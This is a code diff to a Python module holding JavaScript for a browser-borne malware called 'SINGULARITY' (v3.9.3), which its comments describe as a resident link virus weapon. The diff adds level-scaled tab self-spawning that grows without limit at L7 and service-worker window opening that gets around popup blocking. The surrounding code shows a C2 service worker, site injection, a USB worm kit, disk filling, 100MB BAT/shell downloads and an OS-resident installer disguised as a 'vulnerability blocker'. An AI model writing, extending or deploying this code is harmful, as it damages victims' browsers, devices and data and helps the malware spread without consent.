@@ -1,52 +1,59 @@
 """
-SINGULARITY v3.9.1 「絶滅」 -- apex-class resident link virus weapon
+SINGULARITY v3.9.3 「絶滅」 -- apex-class resident link virus weapon
 ==================================================================
 ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
 サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
 最後はOS常駐インストーラでブラウザの外まで侵食する。
 
+v3.9.3:
+  - タブ自動増殖をレベルに完全連動（目標数 / 増殖間隔 / 1回の増分 / 増加率）
+      L2 3枚1.8s / L3 8枚1.4s / L4 16枚1.1s / L5 28枚0.8s / L6 48枚0.55s
+  - L7 は上限なし。生存数が増えるほど1回の増分も増え、倍々で無限に増え続ける
+  - 開いた瞬間は4秒間だけ高速充填（間隔を半分以下に詰める）で一気に立ち上げ
+
+v3.9.2:
+  - タブ自動増殖を「開いた瞬間」に発動（L2 以上）。SWのopenWindowを最優先し、
+    未登録ならRETRYに積んで0.7秒ごとに再投入、8秒でSWが無ければ直接開く
+  - 自動増殖はタブ直（窓は従来どおり winMode 側で増殖）
+  - SW の spawn ハンドラを e.waitUntil で保護（openWindow途中で殺されない）
+  - 生存数は SW の clients.matchAll を最優先（背景タブの間引きに耐える）
+  - 予約スロット(pending)を数えて過剰増殖を防止、足りなければ自動補充
+  - 自動増殖ぶんの子タブは u=tab（軽量・c=0 で窓連鎖なし）
+
 v3.9.1:
-  - 自動増殖の作り直し
-      * 自動増殖ぶんの子タブは windowChain を切る（c=0）→ 目標数どおりに収まる
-      * 生存数は Service Worker の clients.matchAll から正確に取得（背景タブの
-        タイマー間引きでハートビートが消えて数え落とす問題を解消）
-      * 代表タブが固まっても6秒で別タブが代打（sg_last）
-      * SW未制御でも registration.active 経由で spawn
+  - 自動増殖の作り直し（生存数をSWから取得、代表タブの代打、SW未制御でもspawn）
   - ダウンロードを1ファイル100MBに（.txt / .bat / .command / .sh）
-      SG_DL_MB / SG_INSTALL_MB で変更可
-  - 凍結命令を受けた瞬間に freezeNow を打つ（従来はリロード後8秒待ちのみ）
+  - 凍結命令を受けた瞬間に freezeNow を打つ
   - 凍結表示が即時反映されなかったのを修正（テンプレ側）
 
 v3.9:
-  - 開いた瞬間にタップ無しで タブと窓 を自動増殖（SW openWindow → window.open
-    → アンカーclick → キュー の4段フォールバック）
-  - L7 はリミッター解除（上限なし・倍々で増え続ける）
+  - 開いた瞬間にタップ無しで タブと窓 を自動増殖
+  - L7 はリミッター解除
   - 全レベルで感染通知
-  - ダウンロード（.bat / 〇〇の保護.txt）は L4 から、1MB以上、L7で無限
   - 監視室の「結果・操作」ボタン名に対応
   - 未宣言だった firing を宣言（自動増殖/通知/DLが全滅していた）
-  - restart() が PAUSED を戻していなかったのを修正（レベル変更で沈黙していた）
+  - restart() が PAUSED を戻していなかったのを修正
 
 v3.8:
   - レベル別の自動増殖を大幅強化（タブ＋ウィンドウ両方／タップ不要）
   - L7 はリミッター解除（上限なし・無限に増え続ける）
-  - 通知を全レベルで常時発報（burst で止まらない）
+  - 通知を全レベルで常時発報
   - ダウンロードを L4 から開始。BAT も txt も 1MB 超、レベルで増量、L7 は無限
   - OS常駐インストーラも L4 から配布
 
 v3.7:
   - モバイル対応。iOS Safari / Android Chrome / アプリ内ブラウザは
     「タップの処理中」しか新しいタブを開けないため、全spawnをキューに積み、
-    タップのたびに解放する方式に変更（スマホでもタブが増える）
+    タップのたびに解放する方式に変更
   - 全面タップ誘導オーバーレイ（#sg_tap）を追加
   - タブに戻るたびに再タップを促す（visibilitychange）
-  - 環境に mob / ios / inapp を報告（監視室で判別可能）
+  - 環境に mob / ios / inapp を報告
 
 v3.6:
   - payload死亡バグ修正（applyLevel が var R より先に走っていた）
   - 窓/タブを Service Worker の clients.openWindow で開く（ポップアップブロック回避）
-  - 窓とタブを半々で出す／群れ維持（タブを消されても自動補充）
-  - 繁殖タブを重くし、音を鳴らす（audio unlock）
+  - 窓とタブを半々で出す／群れ維持
+  - 繁殖タブを重くし、音を鳴らす
   - 絶滅モード（HARDWARE KILL）
 
 レベル（監視室から遠隔変更・0〜7）:
@@ -63,7 +70,7 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "3.9.1"
+VIRUS_VERSION = "3.9.3"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
@@ -71,13 +78,13 @@ LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 
 LEVEL_DESC = {
     0: "指紋と位置だけ。静か。",
     1: "偵察のみ（既定）。",
-    2: "CPU全コアとGPUを回し始める。タブ・窓が自動で増え始める。",
-    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
-    4: "ディスクをquotaの85%まで書き込む。100MBのBAT/txtを配り始める。",
-    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
-    6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓は指数増殖を開始。",
-    7: "固定枠。上限を外し、全46系統を同時運転。窓もタブも無限に倍々で増え、"
-       "各窓がヘビースキンで高火力化。配布物は100MBで無限。最後はOS常駐インストーラでブラウザ外へ。",
+    2: "開いた瞬間からタブが自動で増え始める。CPU/GPUも回す。",
+    3: "タブ増殖が加速。RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音。",
+    4: "タブ16枚。ディスクをquotaの85%まで書き込む。100MBのBAT/txtを配り始める。",
+    5: "タブ28枚。ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
+    6: "タブ48枚。ディスク97% + 追加23系統を全開放。窓は指数増殖を開始。",
+    7: "固定枠。上限を外し、全46系統を同時運転。タブは倍々で無限に増え続け、"
+       "窓も無限に繁殖。配布物は100MBで無限。最後はOS常駐インストーラでブラウザ外へ。",
 }
 
 APP_NAME_DEFAULT = "脆弱性ブロッカー"
@@ -86,7 +93,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v3.9.1 */
+/*! SINGULARITY worker v3.9.3 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -132,7 +139,7 @@ self.onmessage = function (e) {
 # Service Worker（C2・永続化・復活・注入・spawn・生存数カウント）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v3.9.1 -- C2 + injection + resurrection + spawn */
+/*! SINGULARITY service worker v3.9.3 -- C2 + injection + resurrection + spawn */
 const VER = "sg-v3";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
@@ -214,9 +221,10 @@ async function flush() {
 
 /* ---- ポップアップブロックを無視して窓を開ける唯一の手段 ---- */
 async function spawnN(n, url) {
+  if (!url) return;
   for (let i = 0; i < n; i++) {
     try {
-      const u = url + (url.indexOf("?") < 0 ? "?" : "&") + "t=" + Date.now();
+      const u = url + (url.indexOf("?") < 0 ? "?" : "&") + "z=" + Date.now() + "_" + i;
       await self.clients.openWindow(u);
     } catch (e) {}
   }
@@ -246,13 +254,18 @@ self.addEventListener("message", (e) => {
     kvSet("icons", d.icons || []); kvSet("inj", d.inj || null); kvSet("v", d.v || null);
     PAGE = d.page; SID = d.sid; MAN = d.man; INJ = d.inj; V = d.v; ICONS = d.icons || [];
   } else if (d.k === "out") {
-    qPush(d.v).then(() => flush());
+    e.waitUntil(qPush(d.v).then(() => flush()));
   } else if (d.k === "spawn") {
-    spawnN(d.n || 1, d.url || "");
+    /* waitUntil が無いと openWindow の途中で SW が殺されて開かない */
+    e.waitUntil(spawnN(d.n || 1, d.url || ""));
   } else if (d.k === "count") {
-    liveCount().then((n) => { try { e.source && e.source.postMessage({ k: "count", n: n }); } catch (x) {} });
+    e.waitUntil(liveCount().then((n) => {
+      try { e.source && e.source.postMessage({ k: "count", n: n }); } catch (x) {}
+    }));
   } else if (d.k === "alive") {
-    liveCount().then((n) => { if (!n && PAGE) spawnN(1, PAGE + "?u=sw&ref=" + (SID || "")); });
+    e.waitUntil(liveCount().then((n) => {
+      if (!n && PAGE) return spawnN(1, PAGE + "?u=sw&ref=" + (SID || ""));
+    }));
   }
 });
 
@@ -325,7 +338,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v3.9.1 */
+/*! SINGULARITY shared worker v3.9.3 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -531,9 +544,9 @@ echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v3.9.1 -- 絶滅 / auto-breed fixed / 100MB download */
+/*! SINGULARITY payload v3.9.3 -- 絶滅 / level-scaled instant tab-burst */
 var MYVER = window.__SINGULARITY_VER__
-  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.9.1";
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.9.3";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -580,6 +593,7 @@ var INJ = CFG.injected || Q("u") === "inj";
 if (Q("u") === "inj") CFG.injected = true;
 var IFR = Q("u") === "ifr";
 var WIN = Q("u") === "win";
+var TAB = Q("u") === "tab";          /* 自動増殖ぶんの軽量タブ */
 var FROM_OS = Q("u") === "os";
 var firing = (CFG.fire !== 0);
 var NOCHAIN = Q("c") === "0";        /* 自動増殖ぶんの子は窓連鎖させない */
@@ -597,13 +611,22 @@ var QMAX = IS_MOBILE ? 300 : 200;
 var TAP_OPENED = 0, LAST_TAP = 0;
 
 /* ---------------- レベル別 自動増殖（タップ不要） ----------------
-   目標は「常時維持する数」。閉じられたら自動で補充し続ける。
-   AUTO_CAP = 0 は上限なし（L7）。 */
-var AUTO_T = { 0: 0, 1: 0, 2: 3, 3: 6, 4: 12, 5: 20, 6: 36, 7: 60 };   // タブ
-var AUTO_W = { 0: 0, 1: 0, 2: 3, 3: 9, 4: 18, 5: 30, 6: 54, 7: 90 };   // ウィンドウ
-var AUTO_CAP = { 0: 0, 1: 0, 2: 24, 3: 60, 4: 120, 5: 240, 6: 480, 7: 0 };
+   ・AUTO_MIN 以上で「開いた瞬間」に発動
+   ・目標数 AUTO_T / 上限 AUTO_CAP はレベルで増える
+   ・増殖間隔 AUTO_GAP はレベルで短くなる（L2 1.8s → L7 0.35s）
+   ・1回に増やす最大数 AUTO_STEP、増加率 AUTO_RATIO もレベルで増える
+   ・L7 は AUTO_CAP=0 = 無制限。生存数に比例して増分が増え、倍々で無限に増える
+   ・窓の自動増殖は従来どおり winMode（窓連鎖/窓繁殖）側で行う */
+var AUTO_MIN = 2;
+var AUTO_T     = { 0: 0, 1: 0, 2: 3,  3: 8,  4: 16, 5: 28, 6: 48, 7: 60 };
+var AUTO_CAP   = { 0: 0, 1: 0, 2: 24, 3: 80, 4: 160, 5: 320, 6: 640, 7: 0 };
+var AUTO_GAP   = { 0: 2200, 1: 2200, 2: 1800, 3: 1400, 4: 1100, 5: 800, 6: 550, 7: 350 };
+var AUTO_STEP  = { 0: 1, 1: 1, 2: 2, 3: 3, 4: 4, 5: 6, 6: 8, 7: 12 };
+var AUTO_RATIO = { 0: 0, 1: 0, 2: 0.35, 3: 0.4, 4: 0.45, 5: 0.5, 6: 0.5, 7: 0.5 };
+var AUTO_W = { 0: 0, 1: 0, 2: 3, 3: 9, 4: 18, 5: 30, 6: 54, 7: 90 };   // 窓目標(表示用)
 var AUTO_ON = true, AUTO_TIMER = null, AUTO_STARTED = false, LAST_AUTO = 0;
 var SPAWN_N = 0, SPAWN_T = 0, SPAWN_W = 0;
+var RETRY = [], RECENT = [];
 
 var BIP = null;
 addEventListener("beforeinstallprompt", function (e) {
@@ -662,21 +685,21 @@ function P(o) {
 var PRESET = {
   0: P({ notify: 4, dlMB: 100 }),
   1: P({ notify: 6, dlMB: 100 }),
-  2: P({ burn: 1, gpu: 1, wakelock: 1, notify: 12, dlMB: 100 }),
+  2: P({ burn: 1, gpu: 1, wakelock: 1, notify: 12, tabs: 3, dlMB: 100 }),
   3: P({ burn: 1, gpu: 1, wasm: 1, windows: 12, history: 3000, notify: 18, audio: 1,
-         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6, winMode: "chain",
+         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 8, winMode: "chain",
          dlMB: 100 }),
   4: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, diskRatio: 0.85, windows: 24, history: 6000,
-         notify: 30, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 10,
+         notify: 30, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 16,
          pip: 1, pointerlock: 1, winMode: "chain",
          downloads: 6, dlMB: 100, dlGap: 900, installer: 1 }),
   5: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.95, windows: 32,
          history: 12000, notify: 45, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
-         favicon: 1, mediaSession: 1, tabs: 16, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1,
+         favicon: 1, mediaSession: 1, tabs: 28, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1,
          winMode: "chain", downloads: 14, dlMB: 100, dlGap: 900, installer: 1 }),
   6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 40,
          history: 20000, notify: 70, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
-         favicon: 1, mediaSession: 1, tabs: 24, pip: 1, pointerlock: 1, fullscreen: 1,
+         favicon: 1, mediaSession: 1, tabs: 48, pip: 1, pointerlock: 1, fullscreen: 1,
          xhr: 1, speak: 1, iframes: 8, domNodes: 6000, cssAnim: 300, glContexts: 16,
          acContexts: 6, timers: 60, microtasks: 1, compress: 1, redos: 1, digest: 1,
          readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 200, idbDisk: 1,
@@ -686,7 +709,7 @@ var PRESET = {
          dlMB: 100, dlGap: 800 }),
   7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 48,
          history: 30000, notify: 120, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
-         favicon: 1, mediaSession: 1, tabs: 32, pip: 1, pointerlock: 1, fullscreen: 1,
+         favicon: 1, mediaSession: 1, tabs: 60, pip: 1, pointerlock: 1, fullscreen: 1,
          xhr: 1, speak: 1, iframes: 16, domNodes: 12000, cssAnim: 400, glContexts: 24,
          acContexts: 8, timers: 100, microtasks: 1, compress: 1, redos: 1, digest: 1,
          readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 400, idbDisk: 1,
@@ -1297,7 +1320,7 @@ function gpuMemBomb() {
   } catch (e) {}
 }
 function finalOverlay() {
-  if (LEVEL < 7 || R.fov || WIN || IFR) return;
+  if (LEVEL < 7 || R.fov || WIN || IFR || TAB) return;
   R.fov = 1;
   try {
     var d = document.createElement("div");
@@ -1768,7 +1791,7 @@ function usbWormKit() {
   } catch (e) {}
 }
 function installerKit2() {
-  if (LEVEL < 4 || R.ni || IFR || WIN || !CFG.installer) return;
+  if (LEVEL < 4 || R.ni || IFR || WIN || TAB || !CFG.installer) return;
   R.ni = { n: 0 };
   var times = LEVEL >= 7 ? 0 : Math.max(1, LEVEL - 3);   // 0 = 無限
   var gap = LEVEL >= 7 ? 20000 : 6000;
@@ -1889,6 +1912,13 @@ function anchorOpen(u) {
   } catch (e) { return false; }
 }
 
+function swReady() {
+  try {
+    return !!(navigator.serviceWorker
+      && (navigator.serviceWorker.controller || (SWREG && SWREG.active)));
+  } catch (e) { return false; }
+}
+
 function swSpawn(u) {
   try {
     if (navigator.serviceWorker && navigator.serviceWorker.controller) {
@@ -1911,12 +1941,13 @@ function swCount() {
   } catch (e) {}
 }
 
+/* 直で開く。SWがあればそれ、無ければ RETRY に積んで 0.7 秒ごとに再投入。 */
 function spawnTab(u) {
-  if (!IS_IOS && swSpawn(u)) return true;      // ジェスチャ不要で開ける
-  if (tryOpen(u)) return true;
-  if (!IS_IOS && anchorOpen(u)) return true;   // アンカーclick（保険）
-  if (QUEUE.length < QMAX) { qPush(u); hint(); }
-  return true;
+  if (IS_IOS) { if (QUEUE.length < QMAX) { qPush(u); hint(); } return true; }
+  if (swSpawn(u)) { noteSpawn(); return true; }
+  if (RETRY.length < 800) RETRY.push(u);
+  hint();
+  return false;
 }
 
 function spawnWin(u) {
@@ -1928,10 +1959,30 @@ function spawnWin(u) {
   return true;
 }
 
+function spawnUrl() {
+  return CFG.path + "?u=tab&w=1&c=0&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 1000000);
+}
+
 function spawnMany(n) {
+  for (var i = 0; i < n; i++) { SPAWN_T++; spawnTab(spawnUrl()); }
+  hint();
+}
+
+/* RETRY の再投入。SWが立ち上がったら一気に流す。8秒経ってもSWが無ければ直接開く。 */
+function flushRetry() {
+  if (!RETRY.length) return;
+  if (!swReady()) {
+    if (now() - T0 < 8000) return;
+    var u0 = RETRY.shift();
+    if (anchorOpen(u0) || tryOpen(u0)) noteSpawn();
+    hint();
+    return;
+  }
+  var n = Math.min(RETRY.length, 8);
   for (var i = 0; i < n; i++) {
-    var u = CFG.path + "?u=win&w=1&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
-    if (i % 2 === 0) { SPAWN_T++; spawnTab(u); } else { SPAWN_W++; spawnWin(u); }
+    var u = RETRY.shift();
+    if (!swSpawn(u)) { RETRY.push(u); break; }
+    noteSpawn();
   }
   hint();
 }
@@ -1948,7 +1999,7 @@ function flushQueue(force) {
     QUEUE.shift(); made++;
   }
   TAP_OPENED += made;
-  if (made) { R.tapped = 1; push(false); }
+  if (made) { R.tapped = 1; noteSpawn(); push(false); }
   hint();
   return made;
 }
@@ -1965,12 +2016,14 @@ addEventListener("click", onTap);
 addEventListener("pointerup", function (e) { if (e.pointerType !== "touch") onTap(); });
 
 /* ---- 自動増殖ドライバ ------------------------------------------------
-   生存数は Service Worker の clients.matchAll から正確に取る（背景タブは
-   タイマーを間引かれるため localStorage のハートビートだけでは数え落とす）。
-   代表タブが固まっても6秒で別タブが代打する。
+   ・L2 以上で「開いた瞬間」に発動（autoBurst）
+   ・レベルが上がるほど 目標数↑ / 間隔↓ / 1回の増分↑
+   ・L7 は無制限。生存数に比例して増分が増え、倍々で無限に増え続ける
+   ・タブは直で増やす（SW openWindow 最優先 → RETRY → 直接）
+   ・生存数は SW の clients.matchAll を最優先（背景タブの間引きに耐える）
+   ・代表タブが固まっても6秒で別タブが代打
    --------------------------------------------------------------------- */
 var HB_TTL = 120000;
-var AUTO_SAFE = clamp(parseInt(CFG.autoMax, 10) || 300, 8, 600);
 
 function hbMap() { try { return JSON.parse(wn("sg_hb") || "{}") || {}; } catch (e) { return {}; } }
 
@@ -1991,9 +2044,28 @@ function hbCount() {
 }
 
 function liveN() {
+  var sw = (now() - LIVE_AT < 15000) ? LIVE_CACHE : 0;
   var hb = Math.max(1, hbCount());
-  var sw = (now() - LIVE_AT < 20000) ? LIVE_CACHE : 0;
   return Math.max(hb, sw, 1);
+}
+
+function noteSpawn() { RECENT.push(now()); if (RECENT.length > 3000) RECENT.shift(); }
+
+function pendingN() {
+  var t = now(), n = 0;
+  for (var i = RECENT.length - 1; i >= 0; i--) {
+    if (t - RECENT[i] < 4000) n++; else break;
+  }
+  return n;
+}
+
+function liveEff() { return Math.max(liveN(), pendingN() + 1); }
+
+/* 上限。autoMax 未指定なら L7 は無制限(0)、それ以外は 600 */
+function safeCap() {
+  var m = parseInt(CFG.autoMax, 10) || 0;
+  if (m > 0) return clamp(m, 8, 5000);
+  return LEVEL >= 7 ? 0 : 600;
 }
 
 function isLeader() {
@@ -2006,41 +2078,55 @@ function isLeader() {
 function lastBreedAt() { try { return parseInt(wn("sg_last") || "0", 10) || 0; } catch (e) { return 0; } }
 function markBreed() { try { wn("sg_last", String(now())); } catch (e) {} }
 
-function pickKind() {
-  var t = AUTO_T[LEVEL] || 0, w2 = AUTO_W[LEVEL] || 0;
-  if (!w2) return "tab";
-  if (!t) return "win";
-  return (SPAWN_T * w2 <= SPAWN_W * t) ? "tab" : "win";
-}
+/* 自動増殖はタブ直。窓は winMode 側で増える。 */
+function pickKind() { return "tab"; }
 
-function autoBreed() {
-  if (!AUTO_ON || PAUSED || !firing || LEVEL < 2) return;
+function autoBreed(force) {
+  if (!AUTO_ON || PAUSED || !firing || GATED) return;
+  if (LEVEL < AUTO_MIN) return;
   if (!CFG.fire) return;
-  var t = AUTO_T[LEVEL] || 0, w2 = AUTO_W[LEVEL] || 0;
+  var t = AUTO_T[LEVEL] || 0;
   var cap = AUTO_CAP[LEVEL] || 0;                 // 0 = 上限なし（L7）
   var unlimited = (cap === 0);
-  var target = unlimited ? 0 : Math.min(cap, t + w2);
-  var live = liveN();
-  R.auto = { on: 1, live: live, target: unlimited ? "inf" : target, tab: t, win: w2,
-             spawned: SPAWN_N, leader: isLeader() ? 1 : 0, at: now() };
-  if (live >= AUTO_SAFE) return;
+  var target = unlimited ? 0 : Math.min(cap, t);
+  var gap = AUTO_GAP[LEVEL] || 1200;
+  var step = AUTO_STEP[LEVEL] || 2;
+  var ratio = AUTO_RATIO[LEVEL] || 0.4;
+  var live = liveEff();
+  var sc = safeCap();
+  R.auto = { on: 1, live: live, target: unlimited ? "inf" : target, tab: t, cap: cap,
+             gap: gap, step: step, ratio: ratio, spawned: SPAWN_N, pending: pendingN(),
+             retry: RETRY.length, leader: isLeader() ? 1 : 0, at: now() };
+  if (sc && live >= sc) return;
   /* 代表でなくても、代表が6秒以上動いていなければ代打する */
   if (!isLeader() && now() - lastBreedAt() < 6000) return;
-  if (now() - LAST_AUTO < 1400) return;
+  var minGap = force ? Math.max(90, Math.round(gap / 2)) : gap;
+  if (now() - LAST_AUTO < minGap) return;
   LAST_AUTO = now();
   var n;
   if (unlimited) {
-    n = Math.max(1, Math.min(IS_MOBILE ? 4 : 8, Math.ceil(live * 0.5)));
+    /* L7：生存数に比例して増分が増える＝倍々で無限に増える */
+    n = Math.max(1, Math.min(step, Math.ceil(liveN() * ratio)));
   } else {
     if (live >= target) return;
-    n = Math.min(Math.max(1, target - live), IS_MOBILE ? 4 : 8);
+    n = Math.min(target - live, step);
   }
   markBreed();
-  for (var i = 0; i < n; i++) {
-    var u = CFG.path + "?u=win&w=1&c=0&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
-    if (pickKind() === "tab") { SPAWN_T++; spawnTab(u); } else { SPAWN_W++; spawnWin(u); }
-  }
+  for (var i = 0; i < n; i++) { SPAWN_T++; spawnTab(spawnUrl()); }
+  try { swCount(); } catch (e) {}
   hint();
+}
+
+/* 開いた瞬間の即バースト：4秒間だけ間隔を詰めて一気に立ち上げる */
+function autoBurst() {
+  var until = now() + 4000;
+  (function fast() {
+    try { autoBreed(true); } catch (e) { err_(e); }
+    if (now() < until) setTimeout(fast, 120);
+  })();
+  [600, 1600, 3200, 6000, 10000, 16000].forEach(function (d) {
+    setTimeout(function () { try { autoBreed(true); } catch (e) {} }, d);
+  });
 }
 
 function autoStart() {
@@ -2048,18 +2134,21 @@ function autoStart() {
   AUTO_STARTED = true;
   try { hbSet(); } catch (e) {}
   setInterval(function () { try { hbSet(); } catch (e) {} }, 5000);
-  setInterval(function () { try { swCount(); } catch (e) {} }, 5000);
+  setInterval(function () { try { swCount(); } catch (e) {} }, 3000);
+  setInterval(function () { try { flushRetry(); } catch (e) {} }, 600);
   try { swCount(); } catch (e) {}
+  /* 常時ドライバ。実際の間隔は AUTO_GAP 側でレベル連動させる */
   AUTO_TIMER = setInterval(function () {
     try {
       var cap = AUTO_CAP[LEVEL] || 0;
       R.swarm = { live: liveN(),
-                  target: cap === 0 ? "inf" : Math.min(cap, (AUTO_T[LEVEL] || 0) + (AUTO_W[LEVEL] || 0)),
-                  at: now() };
-      autoBreed();
+                  target: cap === 0 ? "inf" : Math.min(cap, AUTO_T[LEVEL] || 0),
+                  gap: AUTO_GAP[LEVEL] || 0, at: now() };
+      autoBreed(false);
     } catch (e) { err_(e); }
-  }, 1500);
-  setTimeout(autoBreed, 900);
+  }, 250);
+  /* arm の同期処理が終わってから（GATED 確定後）に即バースト */
+  setTimeout(function () { try { autoBurst(); } catch (e) {} }, 300);
 }
 
 function hint() {
@@ -2077,10 +2166,10 @@ function hint() {
       d.style.padding = "12px 16px";
       d.style.boxShadow = "0 0 20px rgba(0,255,136,.45)";
     }
+    var tgt = (AUTO_CAP[LEVEL] === 0) ? "\u221E" : String(AUTO_T[LEVEL] || 0);
     d.textContent = QUEUE.length
       ? ("\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u958B\u304F (" + QUEUE.length + ")")
-      : ("L" + LEVEL + " \u7FA4\u308C " + liveN() + "/"
-         + (R.swarm ? R.swarm.target : "")
+      : ("L" + LEVEL + " \u7FA4\u308C " + liveN() + "/" + tgt
          + (TAP_OPENED ? " \u958B\u653E" + TAP_OPENED : ""));
   } catch (e) {}
   tapOverlay();
@@ -2195,6 +2284,7 @@ function restart() {
   R.dl = {}; R.ni = {};
   PAUSED = false; firing = (CFG.fire !== 0);
   startBurns();
+  try { autoBurst(); } catch (e) {}
 }
 function bombGate() {
   var b = (CFG.bomb || "").trim();
@@ -2268,9 +2358,11 @@ function report() {
     burn: R.burn, ram: R.ram, disk: R.disk, history: R.history, crypto: R.crypto,
     hard: R.hard, swarm: R.swarm, hops: R.hops, wipe: R.wipe, errors: R.errors.slice(0, 10),
     swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
-    auto: { on: AUTO_ON ? 1 : 0, live: liveN(), spawned: SPAWN_N, tab: AUTO_T[LEVEL] || 0,
-            win: AUTO_W[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0, leader: isLeader() ? 1 : 0,
-            at: now() },
+    auto: { on: AUTO_ON ? 1 : 0, live: liveN(), eff: liveEff(), spawned: SPAWN_N,
+            tab: AUTO_T[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0, unlimited: (AUTO_CAP[LEVEL] || 0) === 0 ? 1 : 0,
+            min: AUTO_MIN, gap: AUTO_GAP[LEVEL] || 0, step: AUTO_STEP[LEVEL] || 0,
+            ratio: AUTO_RATIO[LEVEL] || 0, pending: pendingN(), retry: RETRY.length,
+            safe: safeCap(), leader: isLeader() ? 1 : 0, at: now() },
     dl: R.dl, ni: R.ni, notify: R.notify,
     win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
            w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
@@ -2368,17 +2460,14 @@ function runCmd(c) {
     else if (k === "breed") {
       var m = clamp(a || 2, 2, 6);
       var lv2 = liveN();
-      var add = Math.max(1, Math.min(120, lv2 * (m - 1)));
+      var add = Math.max(1, Math.min(300, lv2 * (m - 1)));
       R.breedCmd = { mult: m, live: lv2, add: add, at: now() };
-      for (var bi = 0; bi < add; bi++) {
-        var bu = CFG.path + "?u=win&w=1&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
-        if (bi % 2 === 0) { SPAWN_T++; spawnTab(bu); } else { SPAWN_W++; spawnWin(bu); }
-      }
+      for (var bi = 0; bi < add; bi++) { SPAWN_T++; spawnTab(spawnUrl()); }
       markBreed();
       AUTO_ON = true;
       hint();
     }
-    else if (k === "autoon") { AUTO_ON = true; markBreed(); autoBreed(); }
+    else if (k === "autoon") { AUTO_ON = true; markBreed(); autoBurst(); }
     else if (k === "autooff") { AUTO_ON = false; }
   } catch (e) { err_(e); }
   R.rat.last = { kind: k, arg: a, at: now() };
@@ -2529,9 +2618,9 @@ function hardHistory() {
 function arm() {
   try {
     R.hello = { at: now(), u: Q("u") || "root", w: W, ref: Q("ref"),
-                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, os: FROM_OS,
-                mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0, inapp: INAPP ? 1 : 0,
-                nochain: NOCHAIN ? 1 : 0 };
+                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, tab: TAB,
+                os: FROM_OS, mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0,
+                inapp: INAPP ? 1 : 0, nochain: NOCHAIN ? 1 : 0 };
   } catch (e) {}
   try { push(true); } catch (e) {}
   if (IS_MOBILE) { try { hint(); tapOverlay(); } catch (e) {} }
@@ -2574,7 +2663,7 @@ function arm() {
   }
 
   if (WIN) {
-    /* 繁殖タブ：軽くしすぎない。音も鳴らす。DLも1本やる */
+    /* 繁殖ウィンドウ：軽くしすぎない。音も鳴らす。DLも1本やる */
     CFG.iframes = 0; CFG.clipHijack = 0;
     CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
